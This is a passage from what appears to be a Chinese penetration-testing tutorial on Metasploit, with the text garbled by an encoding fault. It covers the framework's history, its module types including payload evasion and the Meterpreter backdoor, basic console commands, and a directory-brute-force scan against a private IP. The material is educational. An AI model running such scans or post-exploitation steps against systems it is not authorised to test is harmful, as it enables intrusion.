ä¸ªæ”»å‡»è½½è·æ¨¡å—ä»¥åŠ30 ä¸ªæ–°å¼•å…¥çš„è¾…åŠ©æ¨¡å—ï¼ˆæ‰«æçˆ†ç ´æ¨¡å—ï¼‰ã€‚</p><p>Metasploit v3.0 çš„å‘å¸ƒä½¿å¾—Metasploit ä¸åœ¨é™äºç”¨ä½œæ¸—é€æ”»å‡»è½¯ä»¶ï¼Œè€ŒçœŸæ­£æˆä¸ºä¸€ä¸ªäº‹å®ä¸Šçš„æ¸—é€æµ‹è¯•æŠ€æœ¯ç ”ç©¶ä¸å¼€å‘å¹³å°ã€‚</p><p>2009 å¹´10æœˆï¼ŒMetasploit é¡¹ç›®è¢«ä¸€å®¶æ¸—é€æµ‹è¯•æŠ€æœ¯é¢†åŸŸçš„çŸ¥åå®‰å…¨å…¬å¸Rapid7 æ‰€æ”¶è´­ã€‚Rapid7 å…¬å¸éšåä¸2010 å¹´10æœˆæ¨å‡ºäº† Metasploit Express å’ŒPro å•†ä¸šç‰ˆæœ¬ã€‚</p><p>Metasploit v4.0 åœ¨2011 å¹´8 æœˆå‘å¸ƒã€‚v4.0 ç‰ˆæœ¬åœ¨æ¸—é€æ”»å‡»ã€æ”»å‡»è½½è·ä¸è¾…åŠ©æ¨¡å—çš„æ•°é‡ä¸Šéƒ½æœ‰æ˜¾è‘—çš„æ‰©å±•ï¼Œæ­¤å¤–è¿˜å¼•å…¥ä¸€ç§æ–°çš„æ¨¡å—ç±»å‹â€”â€”åæ¸—é€æ”»å‡»æ¨¡å—ï¼Œä»¥æ”¯æŒåœ¨æ¸—é€æ”»å‡»ç¯èŠ‚ä¸­è¿›è¡Œæ•æ„Ÿä¿¡æ¯æœé›†ã€å†…ç½‘æ‹“å±•ç­‰ä¸€ç³»åˆ—çš„æ”»å‡»æµ‹è¯•ã€‚</p><p>Metasploit v5.0 åœ¨2019 å¹´1æœˆä»½å‘å¸ƒã€‚Metasploit 5.0 ä½¿ç”¨äº†æ–°çš„æ•°æ®åº“ï¼Œå¹¶æä¾›äº†ä¸€ç§æ–°çš„æ•°æ®æœåŠ¡ã€‚æ–°ç‰ˆæœ¬å¼•å…¥äº†æ–°çš„è§„é¿æœº åˆ¶(evasion capabilities)ï¼Œæ”¯æŒå¤šé¡¹è¯­è¨€ï¼Œæ¡†æ¶å»ºç«‹åœ¨ä¸æ–­å¢é•¿çš„ä¸–ç•Œçº§æ”»å‡»æ€§å†…å®¹åº“çš„æ¡†æ¶åŸºç¡€ä¸Šã€‚å¦å¤–ï¼Œæ­¤æ¬¡æ›´æ–°è¿˜åŒ…æ‹¬äº†å¯ç”¨æ€§æ”¹è¿›å’Œå¤§è§„æ¨¡å¼€å‘çš„æ”¯æŒï¼Œæ•°æ®åº“å’Œè‡ªåŠ¨åŒ– API çš„æ”¹è¿›ç­‰ã€‚</p><h1 id="ä¸‰ã€ä¸ºä»€ä¹ˆä½¿ç”¨Metasploit"><a href="#ä¸‰ã€ä¸ºä»€ä¹ˆä½¿ç”¨Metasploit" class="headerlink" title="ä¸‰ã€ä¸ºä»€ä¹ˆä½¿ç”¨Metasploit"></a>ä¸‰ã€ä¸ºä»€ä¹ˆä½¿ç”¨Metasploit</h1><p>æ¸—é€æ”»å‡»æ˜¯ç›®å‰Metasploit æœ€å¼ºå¤§å’Œæœ€å…·å¸å¼•åŠ›çš„æ ¸å¿ƒåŠŸèƒ½ï¼ŒMetasploit æ¡†æ¶ä¸­é›†æˆäº†æ•°ç™¾ä¸ªé’ˆå¯¹ä¸»æµæ“ä½œç³»ç»Ÿå¹³å°ä¸Šï¼Œä¸åŒç½‘ç»œæœåŠ¡ä¸åº”ç”¨è½¯ä»¶å®‰å…¨æ¼æ´çš„æ¸—é€æ”»å‡»æ¨¡å—ï¼Œå¯ä»¥ç”±ç”¨æˆ·åœ¨æ¸—é€æ”»å‡»åœºæ™¯ä¸­æ ¹æ®æ¼æ´æ‰«æç»“æœè¿›è¡Œé€‰æ‹©ï¼Œå¹¶èƒ½å¤Ÿè‡ªç”±è£…é…è¯¥å¹³å°ä¸Šé€‚ç”¨çš„å…·æœ‰æŒ‡å®šåŠŸèƒ½çš„æ”»å‡»è½½è·ï¼Œç„¶åé€šè¿‡è‡ªåŠ¨åŒ–ç¼–ç æœºåˆ¶ç»•è¿‡æ”»å‡»é™åˆ¶ä¸æ£€æµ‹æªæ–½ï¼Œå¯¹ç›®æ ‡ç³»ç»Ÿå®æ–½è¿œç¨‹æ”»å‡»ï¼Œè·å–ç³»ç»Ÿçš„è®¿é—®æ§åˆ¶æƒã€‚</p><p>é™¤äº†æ¸—é€æ”»å‡»ä¹‹å¤–ï¼ŒMetasploit åœ¨å‘å±•è¿‡ç¨‹ä¸­é€æ¸å¢åŠ å¯¹æ¸—é€æµ‹è¯•å…¨è¿‡ç¨‹çš„æ”¯æŒï¼ŒåŒ…æ‹¬æƒ…æŠ¥æœé›†ã€å¨èƒå»ºæ¨¡ã€æ¼æ´åˆ†æã€åæ¸—é€æ”»å‡»ä¸æŠ¥å‘Šç”Ÿæˆã€‚</p><h2 id="3-1-æƒ…æŠ¥æœé›†é˜¶æ®µ"><a href="#3-1-æƒ…æŠ¥æœé›†é˜¶æ®µ" class="headerlink" title="3.1 æƒ…æŠ¥æœé›†é˜¶æ®µ"></a>3.1 æƒ…æŠ¥æœé›†é˜¶æ®µ</h2><p> Metasploit ä¸€æ–¹é¢é€šè¿‡å†…å»ºçš„ä¸€ç³»åˆ—æ‰«æå™¨ä¸æŸ¥ç‚¹è¾…åŠ©æ¨¡å—æ¥è·å–è¿œç¨‹æœåŠ¡å™¨ä¿¡æ¯ï¼Œå¦ä¸€æ–¹é¢é€šè¿‡æ’ä»¶æœºåˆ¶é›†æˆè°ƒç”¨Nmapã€Nessusã€OpenVAS ç­‰ä¸šç•Œè‘—åçš„å¼€æºç½‘ç»œæ‰«æå·¥å…·ï¼Œä»è€Œå…·å¤‡å…¨é¢çš„ä¿¡æ¯æœé›†èƒ½åŠ›ï¼Œä¸ºæ¸—é€æ”»å‡»å®æ–½æä¾›å¿…ä¸å¯å°‘çš„ç²¾ç¡®æƒ…æŠ¥ã€‚ </p><h2 id="3-2-å¨èƒå»ºæ¨¡é˜¶æ®µ"><a href="#3-2-å¨èƒå»ºæ¨¡é˜¶æ®µ" class="headerlink" title="3.2 å¨èƒå»ºæ¨¡é˜¶æ®µ"></a>3.2 å¨èƒå»ºæ¨¡é˜¶æ®µ</h2><p> åœ¨æœé›†ä¿¡æ¯ä¹‹åï¼ŒMetasploit æ”¯æŒä¸€ç³»åˆ—æ•°æ®åº“å‘½ä»¤æ“ä½œç›´æ¥å°†è¿™äº›ä¿¡æ¯æ±‡æ€»è‡³PostgreSQLã€MySQLã€SQLite æ•°æ®åº“ä¸­ï¼Œå¹¶ä¸ºç”¨æˆ·æä¾›æ˜“ç”¨çš„æ•°æ®åº“æŸ¥è¯¢å‘½ä»¤ï¼Œå¯ä»¥å¸®åŠ©æ¸—é€æµ‹è¯•è€…å¯¹ç›®æ ‡ç³»ç»Ÿæœç´¢åˆ°çš„æƒ…æŠ¥è¿›è¡Œå¨èƒå»ºæ¨¡ï¼Œä»ä¸­æ‰¾å‡ºæœ€å¯è¡Œçš„æ”»å‡»è·¯å¾„ã€‚</p><h2 id="3-3-æ¼æ´åˆ†æé˜¶æ®µ"><a href="#3-3-æ¼æ´åˆ†æé˜¶æ®µ" class="headerlink" title="3.3 æ¼æ´åˆ†æé˜¶æ®µ"></a>3.3 æ¼æ´åˆ†æé˜¶æ®µ</h2><p>  é™¤äº†ä¿¡æ¯æœé›†ç¯èŠ‚èƒ½å¤Ÿç›´æ¥æ‰«æå‡ºä¸€äº›å·²å…¬å¸ƒçš„å®‰å…¨æ¼æ´ä¹‹å¤–ï¼ŒMetasploit ä¸­è¿˜æä¾›äº†å¤§é‡çš„åè®®Fuzz æµ‹è¯•å™¨ä¸Web åº”ç”¨æ¼æ´æ¢æµ‹åˆ†ææ¨¡å—ï¼Œæ”¯æŒå…·æœ‰ä¸€å®šæ°´å¹³èƒ½åŠ›çš„æ¸—é€æµ‹è¯•è€…åœ¨å®é™…è¿‡ç¨‹ä¸­å°è¯•æŒ–æ˜å‡º0Day æ¼æ´ï¼Œå¹¶å¯¹æ¼æ´æœºç†ä¸åˆ©ç”¨æ–¹æ³•è¿›è¡Œæ·±å…¥åˆ†æï¼Œè€Œè¿™å°†ä¸ºæ¸—é€æ”»å‡»ç›®æ ‡å¸¦æ¥æ›´å¤§çš„æ€ä¼¤åŠ›ï¼Œå¹¶æå‡æ¸—é€æµ‹è¯•æµç¨‹çš„æŠ€æœ¯å«é‡‘é‡ã€‚</p><h2 id="3-4-åæ¸—é€æ”»å‡»é˜¶æ®µ"><a href="#3-4-åæ¸—é€æ”»å‡»é˜¶æ®µ" class="headerlink" title="3.4 åæ¸—é€æ”»å‡»é˜¶æ®µ"></a>3.4 åæ¸—é€æ”»å‡»é˜¶æ®µ</h2><p>  åœ¨æˆåŠŸå®æ–½æ¸—é€æ”»å‡»å¹¶è·å¾—ç›®æ ‡ç³»ç»Ÿçš„è¿œç¨‹æ§åˆ¶æƒä¹‹åï¼ŒMetasploit æ¡†æ¶ä¸­å¦ä¸€ä¸ªæå…·å¨åçš„å·¥å…·Meterpreter åœ¨åæ¸—é€æ”»å‡»é˜¶æ®µæä¾›äº†å¼ºå¤§åŠŸèƒ½ã€‚</p><p>  Meterpreter å¯ä»¥çœ‹ä½œä¸€ä¸ªæ”¯æŒå¤šæ“ä½œç³»ç»Ÿå¹³å°ï¼Œå¯ä»¥ä»…ä»…é©»ç•™äºå†…å­˜ä¸­å¹¶å…·å¤‡å…æ€èƒ½åŠ›çš„é«˜çº§åé—¨å·¥å…·ï¼ŒMeterpreter ä¸­å®ç°äº†ç‰¹æƒæå‡ã€ä¿¡æ¯æ”«å–ã€ç³»ç»Ÿç›‘æ§ã€è·³æ¿æ”»å‡»ä¸å†…ç½‘æ‹“å±•ç­‰å¤šæ ·åŒ–çš„åŠŸèƒ½ç‰¹æ€§ï¼Œæ­¤å¤–è¿˜æ”¯æŒä¸€ç§çµæ´»å¯æ‰©å±•çš„æ–¹å¼æ¥åŠ è½½é¢å¤–åŠŸèƒ½çš„åæ¸—é€æ”»å‡»æ¨¡å—ã€‚</p><h2 id="3-5-æŠ¥å‘Šç”Ÿæˆé˜¶æ®µ"><a href="#3-5-æŠ¥å‘Šç”Ÿæˆé˜¶æ®µ" class="headerlink" title="3.5 æŠ¥å‘Šç”Ÿæˆé˜¶æ®µ"></a>3.5 æŠ¥å‘Šç”Ÿæˆé˜¶æ®µ</h2><p>â€‹    Metasploit æ¡†æ¶è·å¾—çš„æ¸—é€æµ‹è¯•ç»“æœå¯ä»¥è¾“å…¥è‡³å†…ç½®æ•°æ®åº“ä¸­ï¼Œå› æ­¤è¿™äº›ç»“æœå¯ä»¥é€šè¿‡æ•°æ®æŸ¥è¯¢æ¥è·å–ï¼Œå¹¶è¾…åŠ©æ¸—é€æµ‹è¯•æŠ¥å‘Šçš„å†™ä½œã€‚å•†ä¸šç‰ˆçš„Metasploit Pro å…·å¤‡äº†æ›´åŠ å¼ºå¤§çš„æŠ¥å‘Šç”ŸæˆåŠŸèƒ½ï¼Œå¯ä»¥è¾“å‡ºHTMLã€XMLã€Word å’ŒPDF æ ¼å¼çš„æŠ¥å‘Šï¼ŒæŠŠé‚£ä¸ªæ”¯æŒå®šåˆ¶æ¸—é€æµ‹è¯•æŠ¥å‘Šæ¨¡æ¿ã€‚</p><h1 id="å››ã€æŠ€æœ¯æ¶æ„"><a href="#å››ã€æŠ€æœ¯æ¶æ„" class="headerlink" title="å››ã€æŠ€æœ¯æ¶æ„"></a>å››ã€æŠ€æœ¯æ¶æ„</h1><h2 id="4-1-è¾…åŠ©æ¨¡å—"><a href="#4-1-è¾…åŠ©æ¨¡å—" class="headerlink" title="4.1 è¾…åŠ©æ¨¡å—"></a>4.1 è¾…åŠ©æ¨¡å—</h2><p>Metasploit ä¸ºæ¸—é€æµ‹è¯•çš„ä¿¡æ¯æœé›†ç¯èŠ‚æä¾›äº†å¤§é‡çš„è¾…åŠ©æ¨¡å—æ”¯æŒï¼ŒåŒ…æ‹¬é’ˆå¯¹å„ç§ç½‘ç»œæœåŠ¡çš„æ‰«æä¸æŸ¥ç‚¹ã€æ„å»ºè™šå‡æœåŠ¡æ”¶é›†ç™»å½•å¯†ç ã€å£ä»¤çŒœæµ‹ç ´è§£ã€æ•æ„Ÿä¿¡æ¯å—…æ¢ã€æ¢æŸ¥æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€Fuzz æµ‹è¯•å‘æ˜æ¼æ´ã€å®æ–½ç½‘ç»œåè®®æ¬ºéª—ç­‰æ¨¡å—ã€‚ </p><p>è¾…åŠ©æ¨¡å—èƒ½å¤Ÿå¸®åŠ©æ¸—é€æµ‹è¯•è€…åœ¨æ¸—é€æ”»å‡»ä¹‹å‰å–å¾—ç›®æ ‡ç³»ç»Ÿä¸°å¯Œçš„æƒ…æŠ¥ä¿¡æ¯ã€‚</p><h2 id="4-2-æ¸—é€æ”»å‡»æ¨¡å—"><a href="#4-2-æ¸—é€æ”»å‡»æ¨¡å—" class="headerlink" title="4.2 æ¸—é€æ”»å‡»æ¨¡å—"></a>4.2 æ¸—é€æ”»å‡»æ¨¡å—</h2><p>æ¸—é€æ”»å‡»æ¨¡å—æ˜¯åˆ©ç”¨å‘ç°çš„å®‰å…¨æ¼æ´æˆ–é…ç½®å¼±ç‚¹å¯¹ç›®æ ‡ç³»ç»Ÿè¿›è¡Œæ”»å‡»ï¼Œä»¥æ¤å…¥å’Œè¿è¡Œæ”»å‡»è½½è·ï¼Œä»è€Œè·å–å¯¹è¿œç¨‹ç›®æ ‡ç³»ç»Ÿè®¿é—®æƒçš„ä»£ç ç»„ä»¶ã€‚</p><h3 id="4-2-1-ä¸»åŠ¨æ¸—é€æ”»å‡»ï¼ˆæ”»å‡»è€…ä¸»åŠ¨å‡ºå‡»ï¼‰"><a href="#4-2-1-ä¸»åŠ¨æ¸—é€æ”»å‡»ï¼ˆæ”»å‡»è€…ä¸»åŠ¨å‡ºå‡»ï¼‰" class="headerlink" title="4.2.1 ä¸»åŠ¨æ¸—é€æ”»å‡»ï¼ˆæ”»å‡»è€…ä¸»åŠ¨å‡ºå‡»ï¼‰"></a>4.2.1 ä¸»åŠ¨æ¸—é€æ”»å‡»ï¼ˆæ”»å‡»è€…ä¸»åŠ¨å‡ºå‡»ï¼‰</h3><p>æ‰€åˆ©ç”¨çš„å®‰å…¨æ¼æ´ä½äºç½‘ç»œæœåŠ¡ç«¯è½¯ä»¶ä¸æœåŠ¡æ‰¿è½½çš„ä¸Šå±‚åº”ç”¨ç¨‹åºä¹‹ä¸­ï¼Œç”±äºè¿™äº›æœåŠ¡é€šå¸¸æ˜¯åœ¨ä¸»æœºä¸Šå¼€å¯ä¸€äº›ç›‘å¬ç«¯å£å¹¶ç­‰å¾…å®¢æˆ·ç«¯è¿æ¥ï¼Œå› æ­¤é’ˆå¯¹å®ƒä»¬çš„æ¸—é€æ”»å‡»å¯ä»¥ä¸»åŠ¨å‘èµ·ï¼Œé€šè¿‡è¿æ¥ç›®æ ‡ç³»ç»Ÿç½‘ç»œæœåŠ¡ï¼Œæ³¨å…¥ä¸€äº›ç‰¹æ®Šæ„é€ çš„åŒ…å«â€é‚ªæ¶â€æ”»å‡»æ•°æ®çš„ç½‘ç»œè¯·æ±‚å†…å®¹ï¼Œè§¦å‘å®‰å…¨æ¼æ´ï¼Œå¹¶ä½¿å¾—è¿œç¨‹æœåŠ¡è¿›ç¨‹æ‰§è¡Œåœ¨â€é‚ªæ¶â€æ•°æ®ä¸­åŒ…å«æ”»å‡»è½½è·ï¼Œä»è€Œè·å–ç›®æ ‡ç³»ç»Ÿçš„æ§åˆ¶ä¼šè¯ã€‚</p><h3 id="4-2-2-è¢«åŠ¨æ¸—é€æ”»å‡»ï¼ˆè¢«åŠ¨ç­‰å¾…å—å®³è€…å‡ºå‘ï¼‰"><a href="#4-2-2-è¢«åŠ¨æ¸—é€æ”»å‡»ï¼ˆè¢«åŠ¨ç­‰å¾…å—å®³è€…å‡ºå‘ï¼‰" class="headerlink" title="4.2.2 è¢«åŠ¨æ¸—é€æ”»å‡»ï¼ˆè¢«åŠ¨ç­‰å¾…å—å®³è€…å‡ºå‘ï¼‰"></a>4.2.2 è¢«åŠ¨æ¸—é€æ”»å‡»ï¼ˆè¢«åŠ¨ç­‰å¾…å—å®³è€…å‡ºå‘ï¼‰</h3><p> åˆ©ç”¨çš„æ¼æ´ä½äºå®¢æˆ·ç«¯è½¯ä»¶ä¸­ï¼Œå¦‚æµè§ˆå™¨ã€æµè§ˆå™¨æ’ä»¶ã€ç”µå­é‚®ä»¶å®¢æˆ·ç«¯ã€Office ä¸Adobe ç­‰å„ç§æ–‡æ¡£é˜…è¯»ä¸ç¼–è¾‘è½¯ä»¶ã€‚å¯¹äºè¿™ç±»å­˜åœ¨äºå®¢æˆ·ç«¯è½¯ä»¶çš„å®‰å…¨æ¼æ´ï¼Œæˆ‘ä»¬æ— æ³•ä¸»åŠ¨åœ°å°†æ•°æ®ä»è¿œç¨‹è¾“å…¥åˆ°å®¢æˆ·ç«¯è½¯ä»¶ä¸­ï¼Œå› æ­¤åªèƒ½é‡‡ç”¨è¢«åŠ¨æ¸—é€æ”»å‡»çš„æ–¹å¼ï¼Œå³æ„é€ å‡ºâ€é‚ªæ¶â€çš„ç½‘é¡µã€ç”µå­é‚®ä»¶æˆ–æ–‡æ¡£æ–‡ä»¶ï¼Œå¹¶é€šè¿‡æ¶è®¾åŒ…å«æ­¤ç±»æ¶æ„å†…å®¹çš„æœåŠ¡ã€å‘é€é‚®ä»¶é™„ä»¶ã€ç»“åˆç¤¾ä¼šå·¥ç¨‹å­¦åˆ†å‘å¹¶è¯±éª—ç›®æ ‡ç”¨æˆ·æ‰“å¼€ã€ç»“åˆç½‘ç»œæ¬ºéª—å’ŒåŠ«æŒæŠ€æœ¯ç­‰æ–¹å¼ï¼Œç­‰ç›®æ ‡ç³»ç»Ÿä¸Šçš„ç”¨æˆ·è®¿é—®åˆ°è¿™äº›é‚ªæ¶çš„å†…å®¹ï¼Œä»è€Œè§¦å‘å®¢æˆ·ç«¯è½¯ä»¶ä¸­çš„å®‰å…¨æ¼æ´ï¼Œç»™å‡ºæ§åˆ¶ç›®æ ‡ç³»ç»Ÿçš„Shell ä¼šè¯ã€‚</p><h2 id="4-3-æ”»å‡»è½½è·æ¨¡å—"><a href="#4-3-æ”»å‡»è½½è·æ¨¡å—" class="headerlink" title="4.3 æ”»å‡»è½½è·æ¨¡å—"></a>4.3 æ”»å‡»è½½è·æ¨¡å—</h2><p>  æ”»å‡»è½½è·æ˜¯åœ¨æ¸—é€æ”»å‡»æˆåŠŸåä½¿ç›®æ ‡ç³»ç»Ÿè¿è¡Œçš„ä¸€æ®µæ¤å…¥ä»£ç ï¼Œé€šå¸¸ä½œç”¨æ˜¯ä¸ºæ¸—é€æ”»å‡»è€…æ‰“å¼€åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šçš„æ§åˆ¶ä¼šè¯è¿æ¥ã€‚</p><h2 id="4-4-ç©ºæŒ‡ä»¤æ¨¡å—"><a href="#4-4-ç©ºæŒ‡ä»¤æ¨¡å—" class="headerlink" title="4.4 ç©ºæŒ‡ä»¤æ¨¡å—"></a>4.4 ç©ºæŒ‡ä»¤æ¨¡å—</h2><p>  ç©ºæŒ‡ä»¤(NOP) æ˜¯ä¸€äº›å¯¹ç¨‹åºè¿è¡ŒçŠ¶æ€ä¸ä¼šé€ æˆä»»ä½•å®è´¨å½±å“çš„ç©ºæ“ä½œæˆ–è€…æ— å…³æ“ä½œæŒ‡ä»¤ï¼Œæœ€å…¸å‹çš„ç©ºæŒ‡ä»¤å°±æ˜¯ç©ºæ“ä½œï¼Œåœ¨x86 CPU ä½“ç³»æ¶æ„å¹³å°ä¸Šçš„æ“ä½œç æ˜¯0x90 ã€‚</p><h2 id="4-5-ç¼–ç å™¨æ¨¡å—"><a href="#4-5-ç¼–ç å™¨æ¨¡å—" class="headerlink" title="4.5 ç¼–ç å™¨æ¨¡å—"></a>4.5 ç¼–ç å™¨æ¨¡å—</h2><p>   æ”»å‡»è½½è·æ¨¡å—ä¸ç©ºæŒ‡ä»¤æ¨¡å—ç»„è£…å®Œæˆä¸€ä¸ªæŒ‡ä»¤åºåˆ—åï¼Œåœ¨è¿™æ®µæŒ‡ä»¤è¢«æ¸—é€æ”»å‡»æ¨¡å—åŠ å…¥é‚ªæ¶æ•°æ®ç¼“å†²åŒºäº¤ç”±ç›®æ ‡ç³»ç»Ÿè¿è¡Œä¹‹å‰ï¼ŒMetasploit æ¡†æ¶è¿˜éœ€è¦å®Œæˆä¸€é“éå¸¸é‡è¦çš„å·¥åºâ€“ç¼–ç ã€‚</p><p>  ç¼–ç å™¨æ¨¡å—çš„ç¬¬ä¸€ä¸ªä½¿å‘½å°±æ˜¯ç¡®ä¿æ”»å‡»è½½è·ä¸­ä¸ä¼šå‡ºç°æ¸—é€æ”»å‡»è¿‡ç¨‹ä¸­åº”åŠ ä»¥é¿å…çš„â€åå­—ç¬¦â€ã€‚</p><p>  ç¼–ç å™¨çš„ç¬¬äºŒä¸ªä½¿å‘½å°±æ˜¯å¯¹æ”»å‡»è½½è·è¿›è¡Œâ€å…æ€â€å¤„ç†ã€‚</p><h2 id="4-6-åæ¸—é€æ”»å‡»æ¨¡å—"><a href="#4-6-åæ¸—é€æ”»å‡»æ¨¡å—" class="headerlink" title="4.6 åæ¸—é€æ”»å‡»æ¨¡å—"></a>4.6 åæ¸—é€æ”»å‡»æ¨¡å—</h2><p>â€‹    åæ¸—é€æ”»å‡»æ¨¡å—ä¸»è¦æ”¯æŒåœ¨æ¸—é€æ”»å‡»å–å¾—ç›®æ ‡ç³»ç»Ÿæ§åˆ¶æƒä¹‹åï¼Œåœ¨å—æ§ç³»ç»Ÿä¸­è¿›è¡Œå„å¼å„æ ·çš„åæ¸—é€æ”»å‡»åŠ¨ä½œï¼Œæ¯”å¦‚è·å–æ•æ„Ÿä¿¡æ¯ã€è¿›ä¸€æ­¥æ‹“å±•ã€å®æ–½è·³æ¿æ”»å‡»ç­‰ã€‚</p><h2 id="4-7-å…æ€æ¨¡å—"><a href="#4-7-å…æ€æ¨¡å—" class="headerlink" title="4.7 å…æ€æ¨¡å—"></a>4.7 å…æ€æ¨¡å—</h2><p>   å¯¹æ”»å‡»è½½è·è¿›è¡Œâ€å…æ€â€å¤„ç†ã€‚</p><h1 id="äº”ã€MSFçš„åŸºç¡€ä½¿ç”¨"><a href="#äº”ã€MSFçš„åŸºç¡€ä½¿ç”¨" class="headerlink" title="äº”ã€MSFçš„åŸºç¡€ä½¿ç”¨"></a>äº”ã€MSFçš„åŸºç¡€ä½¿ç”¨</h1><h2 id="5-1-å¯åŠ¨å’Œè¿›å…¥ã€åŸºæœ¬å‘½ä»¤"><a href="#5-1-å¯åŠ¨å’Œè¿›å…¥ã€åŸºæœ¬å‘½ä»¤" class="headerlink" title="5.1 å¯åŠ¨å’Œè¿›å…¥ã€åŸºæœ¬å‘½ä»¤"></a>5.1 å¯åŠ¨å’Œè¿›å…¥ã€åŸºæœ¬å‘½ä»¤</h2><h3 id="5-1-1-å¯åŠ¨è¿›å…¥"><a href="#5-1-1-å¯åŠ¨è¿›å…¥" class="headerlink" title="5.1.1 å¯åŠ¨è¿›å…¥"></a>5.1.1 å¯åŠ¨è¿›å…¥</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfconsole<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/07/gong-fang-gong-ju-ku/msf-metasploit/%E6%88%AA%E5%B1%8F2025-01-07%2013.52.34.png" style="zoom:30%;"><p>å†…ç½®æ¨¡å—ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">       <span class="token operator">=</span><span class="token punctuation">[</span> metasploit v6.0.30-dev                          <span class="token punctuation">]</span>+ -- --<span class="token operator">=</span><span class="token punctuation">[</span> <span class="token number">2099</span> exploits - <span class="token number">1129</span> auxiliary - <span class="token number">357</span> post       <span class="token punctuation">]</span>+ -- --<span class="token operator">=</span><span class="token punctuation">[</span> <span class="token number">592</span> payloads - <span class="token number">45</span> encoders - <span class="token number">10</span> nops            <span class="token punctuation">]</span>+ -- --<span class="token operator">=</span><span class="token punctuation">[</span> <span class="token number">7</span> evasion                                       <span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-1-2-å†…ç½®å®‰è£…æ¨¡å—"><a href="#5-1-2-å†…ç½®å®‰è£…æ¨¡å—" class="headerlink" title="5.1.2 å†…ç½®å®‰è£…æ¨¡å—"></a>5.1.2 å†…ç½®å®‰è£…æ¨¡å—</h3><p>è¿›å…¥è½¯ä»¶å®‰è£…ç›®å½•ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /usr/share/metasploit-framework<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å…³æ³¨modulesç›®å½•ï¼Œé‡Œé¢æ˜¯msfå†…ç½®çš„å„ç±»æ¨¡å—ã€‚</p><img src="/2025/01/07/gong-fang-gong-ju-ku/msf-metasploit/%E6%88%AA%E5%B1%8F2025-01-07%2013.55.23.png" style="zoom:40%;"><h3 id="5-1-3-ä½¿ç”¨æ¨¡å—çš„åŸºæœ¬å‘½ä»¤"><a href="#5-1-3-ä½¿ç”¨æ¨¡å—çš„åŸºæœ¬å‘½ä»¤" class="headerlink" title="5.1.3 ä½¿ç”¨æ¨¡å—çš„åŸºæœ¬å‘½ä»¤"></a>5.1.3 ä½¿ç”¨æ¨¡å—çš„åŸºæœ¬å‘½ä»¤</h3><ul><li><p>search ã€æŸ¥æ‰¾å¯ç”¨æ¨¡å—ã€‘eg:<code>search ms17-010</code></p></li><li><p>info ã€æŸ¥çœ‹æ¨¡å—ä¿¡æ¯ã€‘</p></li><li><p>set ã€è®¾ç½®å‚æ•°ã€‘</p></li><li><p>show options ã€æ˜¾ç¤ºå‚æ•°è®¾ç½®æƒ…å†µã€‘</p></li><li><p>back ã€å›é€€ã€‘</p></li></ul><h2 id="5-2-æ›´æ–°ï¼ˆå°±æ˜¯é‡è£…ï¼‰"><a href="#5-2-æ›´æ–°ï¼ˆå°±æ˜¯é‡è£…ï¼‰" class="headerlink" title="5.2 æ›´æ–°ï¼ˆå°±æ˜¯é‡è£…ï¼‰"></a>5.2 æ›´æ–°ï¼ˆå°±æ˜¯é‡è£…ï¼‰</h2><p>[apt-get update]</p><p>[apt-get install metasploit-framework]</p><p>âš ï¸ï¼šä¸€ä¸ªæ¨¡å—å°±æ˜¯ä¸€ä¸ªrb è„šæœ¬ï¼Œä¾‹å¦‚ï¼š</p><img src="/2025/01/07/gong-fang-gong-ju-ku/msf-metasploit/%E6%88%AA%E5%B1%8F2025-01-07%2013.58.45.png" style="zoom:30%;"><h2 id="5-3-æƒ…æŠ¥æœé›†"><a href="#5-3-æƒ…æŠ¥æœé›†" class="headerlink" title="5.3 æƒ…æŠ¥æœé›†"></a>5.3 æƒ…æŠ¥æœé›†</h2><h3 id="5-3-1-ç½‘ç«™æ•æ„Ÿç›®å½•æ‰«æï¼ˆç±»æ¯”å¾¡å‰‘ï¼‰"><a href="#5-3-1-ç½‘ç«™æ•æ„Ÿç›®å½•æ‰«æï¼ˆç±»æ¯”å¾¡å‰‘ï¼‰" class="headerlink" title="5.3.1 ç½‘ç«™æ•æ„Ÿç›®å½•æ‰«æï¼ˆç±»æ¯”å¾¡å‰‘ï¼‰"></a>5.3.1 ç½‘ç«™æ•æ„Ÿç›®å½•æ‰«æï¼ˆç±»æ¯”å¾¡å‰‘ï¼‰</h3><ul><li><p>å¯ä»¥å€ŸåŠ©Metasploit ä¸­çš„brute_dirsã€dir_listingã€dir_scanner ç­‰è¾…åŠ©æ¨¡å—æ¥è¿›è¡Œæ•æ„Ÿç›®å½•æ‰«æã€‚</p></li><li><p>ä»–ä»¬ä¸»è¦ä½¿ç”¨æš´åŠ›çŒœè§£çš„æ–¹å¼å·¥ä½œï¼Œæ³¨æ„æ­¤å¤„éœ€è¦æä¾›ä¸€ä¸ªç›®å½•å­—å…¸ã€‚</p></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf5 <span class="token operator">&gt;</span> use auxiliary/scanner/http/dir_scanner msf5 auxiliary<span class="token punctuation">(</span>scanner/http/dir_scanner<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> RHOSTS <span class="token number">172.16</span>.132.138RHOSTS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">172.16</span>.132.138msf5 auxiliary<span class="token punctuation">(</span>scanner/http/dir_scanner<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> <span class="token environment constant">PATH</span> /cms/<span class="token environment constant">PATH</span> <span class="token operator">=</span><span class="token operator">&gt;</span> /cms/msf5 auxiliary<span class="token punctuation">(</span>scanner/http/dir_scanner<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> THREADS <span class="token number">50</span>THREADS <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">50</span>msf5 auxiliary<span class="token punctuation">(</span>scanner/http/dir_scanner<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit<span aria-hidden="true" 